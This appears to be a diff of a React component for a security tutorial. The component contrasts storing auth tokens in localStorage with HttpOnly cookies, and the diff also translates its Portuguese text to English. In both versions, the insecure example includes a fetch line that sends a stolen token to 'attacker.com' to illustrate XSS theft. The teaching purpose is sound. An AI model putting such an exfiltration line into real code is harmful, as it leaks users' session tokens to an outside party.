@@ -1,116 +1,83 @@
 'use client'
 
 import { useState } from 'react'
+import { CodeBox } from './code-box'
 
 export function TokenStorageDemo() {
-  const [demo, setDemo] = useState<'initial' | 'localStorage' | 'cookies'>('initial')
+  const [activeTab, setActiveTab] = useState<'insecure' | 'secure'>('insecure')
 
   return (
-    <div className="my-8 space-y-4">
-      <div className="rounded-2xl border border-slate-800 bg-slate-900/60 p-6">
-        {demo === 'initial' && (
+    <div className="my-8">
+      {/* Tabs */}
+      <div className="flex gap-1 mb-4">
+        <button
+          onClick={() => setActiveTab('insecure')}
+          className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors text-gray-1100 dark:text-gray-1100 ${
+            activeTab === 'insecure'
+              ? 'bg-gray-300 dark:bg-gray-200'
+              : 'hover:bg-gray-300/50 dark:hover:bg-gray-200/50'
+          }`}
+        >
+          ❌ localStorage
+        </button>
+        <button
+          onClick={() => setActiveTab('secure')}
+          className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors text-gray-1100 dark:text-gray-1100 ${
+            activeTab === 'secure'
+              ? 'bg-gray-300 dark:bg-gray-200'
+              : 'hover:bg-gray-300/50 dark:hover:bg-gray-200/50'
+          }`}
+        >
+          ✅ HttpOnly Cookies
+        </button>
+      </div>
+
+      {/* Content - min-height prevents layout shift */}
+      <div className="min-h-[380px]">
+        {activeTab === 'insecure' && (
           <div className="space-y-4">
-            <h3 className="text-lg font-semibold">localStorage vs HttpOnly Cookies</h3>
-            <p className="text-sm text-slate-300">
-              Compare os riscos de cada abordagem para armazenar tokens de autenticação.
+            <CodeBox title="Vulnerable Pattern" language="javascript">
+{`// Frontend stores the token
+localStorage.setItem('access_token', token)
+
+// Any script can access it:
+const stolen = localStorage.getItem('access_token')
+
+// If there's XSS, the token is stolen!
+fetch('https://attacker.com?token=' + stolen)`}
+            </CodeBox>
+            <p className="text-sm text-gray-1100 dark:text-gray-1100">
+              localStorage is accessible via JavaScript. If there's XSS, the attacker steals your token and authenticates as you.
             </p>
           </div>
         )}
 
-        {demo === 'localStorage' && (
+        {activeTab === 'secure' && (
           <div className="space-y-4">
-            <div className="rounded-lg bg-red-950/30 border border-red-900 p-4">
-              <h4 className="font-semibold text-red-400 mb-3">localStorage (INSEGURO)</h4>
-              <pre className="text-xs overflow-x-auto bg-black/50 p-3 rounded mb-3">
-{`// Frontend armazena o token
-localStorage.setItem('access_token', token)
-
-// Qualquer script pode acessar:
-const stolen = localStorage.getItem('access_token')
-
-// Se houver XSS, o token é roubado!
-fetch('https://attacker.com?token=' + stolen)`}</pre>
-              <div className="bg-black/30 p-3 rounded">
-                <p className="text-xs text-slate-300 mb-2">
-                  <strong>Simule no DevTools:</strong>
-                </p>
-                <code className="text-xs text-amber-400">
-                  localStorage.getItem('access_token')
-                </code>
-                <p className="text-xs text-slate-400 mt-2">
-                  ↑ Qualquer script na página pode executar isso
-                </p>
-              </div>
-            </div>
-            <div className="rounded-lg bg-red-900/20 border border-red-800 p-4">
-              <p className="text-sm text-red-300">
-                <strong>Problema:</strong> localStorage é acessível via JavaScript. Se houver XSS, 
-                o atacante rouba seu token e se autentica como você.
-              </p>
-            </div>
-          </div>
-        )}
-
-        {demo === 'cookies' && (
-          <div className="space-y-4">
-            <div className="rounded-lg bg-emerald-950/30 border border-emerald-900 p-4">
-              <h4 className="font-semibold text-emerald-400 mb-3">HttpOnly Cookies (SEGURO)</h4>
-              <pre className="text-xs overflow-x-auto bg-black/50 p-3 rounded mb-3">
-{`// Backend define o cookie (Node.js/Express)
+            <CodeBox title="Secure Pattern" language="javascript">
+{`// Backend sets the cookie
 res.cookie('auth_token', token, {
-  httpOnly: true,    // Inacessível ao JavaScript!
-  secure: true,      // Apenas HTTPS
-  sameSite: 'strict' // Proteção CSRF
+  httpOnly: true,    // Inaccessible to JavaScript!
+  secure: true,      // HTTPS only
+  sameSite: 'strict' // CSRF protection
 })
 
-// Frontend: o cookie é enviado automaticamente
-// Não precisa fazer nada!
+// Frontend: cookie is sent automatically
+// No need to do anything!
 
-// Tentativa de acesso via JavaScript:
-document.cookie // → "" (vazio, protegido!)
-`}</pre>
-              <div className="bg-emerald-950/50 p-3 rounded space-y-2">
-                <p className="text-xs text-emerald-300">
-                  <strong>Benefícios:</strong>
-                </p>
-                <ul className="text-xs text-slate-300 space-y-1 ml-4">
-                  <li><strong>httpOnly:</strong> JavaScript não consegue acessar</li>
-                  <li><strong>secure:</strong> Apenas em HTTPS</li>
-                  <li><strong>sameSite:</strong> Proteção contra CSRF</li>
-                  <li><strong>Automático:</strong> Browser gerencia envio</li>
-                </ul>
-              </div>
-            </div>
-            <div className="rounded-lg bg-emerald-900/20 border border-emerald-800 p-4">
-              <p className="text-sm text-emerald-300">
-                <strong>Solução:</strong> Mesmo com XSS, o atacante não consegue roubar o token.
-                O backend gerencia toda a autenticação de forma segura.
-              </p>
-            </div>
+// Attempt to access via JavaScript:
+document.cookie // → "" (empty, protected!)`}
+            </CodeBox>
+            <ul className="text-sm text-gray-1100 dark:text-gray-1100 space-y-1 list-disc list-inside ml-2">
+              <li><span className="font-medium">httpOnly:</span> JavaScript cannot access</li>
+              <li><span className="font-medium">secure:</span> HTTPS only</li>
+              <li><span className="font-medium">sameSite:</span> CSRF protection</li>
+              <li><span className="font-medium">Automatic:</span> Browser manages sending</li>
+            </ul>
+            <p className="text-sm text-gray-1100 dark:text-gray-1100 italic mt-4">
+              💡 Even with XSS, the attacker cannot steal an HttpOnly cookie.
+            </p>
           </div>
-        )}
-      </div>
-
-      <div className="flex flex-wrap gap-3">
-        <button
-          onClick={() => setDemo('localStorage')}
-          className="inline-flex items-center gap-2 rounded-full bg-rose-500 px-4 py-2 text-sm font-semibold text-slate-950 hover:bg-rose-400 transition-colors"
-        >
-          localStorage (inseguro)
-        </button>
-        <button
-          onClick={() => setDemo('cookies')}
-          className="inline-flex items-center gap-2 rounded-full bg-emerald-500 px-4 py-2 text-sm font-semibold text-slate-950 hover:bg-emerald-400 transition-colors"
-        >
-          HttpOnly Cookie (seguro)
-        </button>
-        {demo !== 'initial' && (
-          <button
-            onClick={() => setDemo('initial')}
-            className="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-sm font-semibold text-slate-100 hover:bg-slate-600 transition-colors"
-          >
-            Resetar
-          </button>
         )}
       </div>
     </div>
